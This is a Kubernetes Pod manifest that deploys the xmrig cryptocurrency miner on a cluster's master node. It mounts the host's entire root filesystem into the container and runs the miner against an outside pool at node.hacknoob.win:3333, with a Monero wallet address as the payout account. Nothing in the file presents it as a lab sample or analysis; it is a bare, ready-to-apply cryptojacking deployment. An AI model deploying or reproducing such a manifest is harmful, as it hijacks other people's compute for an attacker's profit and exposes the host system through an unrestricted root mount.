apiVersion: v1
kind: Pod
metadata:
  name: xmrig-exec-m
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: kubernetes.io/hostname
            operator: In
            values:
            - master
  containers:
  - name: xmrig-container-m
    image: busybox
    command:
    - /home/manager/xmrig/build/xmrig
    - -o
    - node.hacknoob.win:3333
    - -u
    - 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn
    - -p
    - master
    volumeMounts:
    - name: xmrig-volume-m
      mountPath: /
  volumes:
  - name: xmrig-volume-m
    hostPath:
      path: /
